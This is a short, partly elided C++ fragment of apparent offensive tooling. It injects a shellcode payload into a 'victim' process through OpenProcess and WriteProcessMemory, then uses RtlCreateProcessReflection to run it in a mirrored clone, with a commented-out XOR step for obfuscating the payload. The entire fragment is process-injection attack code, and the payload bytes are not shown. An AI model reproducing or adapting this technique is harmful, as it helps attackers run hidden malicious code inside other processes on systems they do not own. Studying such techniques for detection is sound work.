...
void myRtlCreateProcessReflection(DWORD pid) {
	HANDLE victimHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, TRUE, pid);
	//XOR((char*)payload, payload_len2, (char*)key, sizeof(key));
	DWORD_PTR shellcodeSize = sizeof(payload);
	...
	size_t bytess = 0;
	bool status = WriteProcessMemory(victimHandle, baseAddress, payload, sizeof(payload), &bytess);
	printf("[+]\tSuccesfuly wrote payload in process\n");
	T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
	NTSTATUS reflectRet = pRtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, nullptr, NULL, &info);
	if (NT_SUCCESS(reflectRet)) {
		printf("[+]\tSuccesfully Mirrored to new PID : %d\n", info.ReflectionClientId.UniqueProcess);
	}
	else {
		printf("\n[!]\tError Mirroring: ERROR %u\n\n", GetLastError());
	}
}
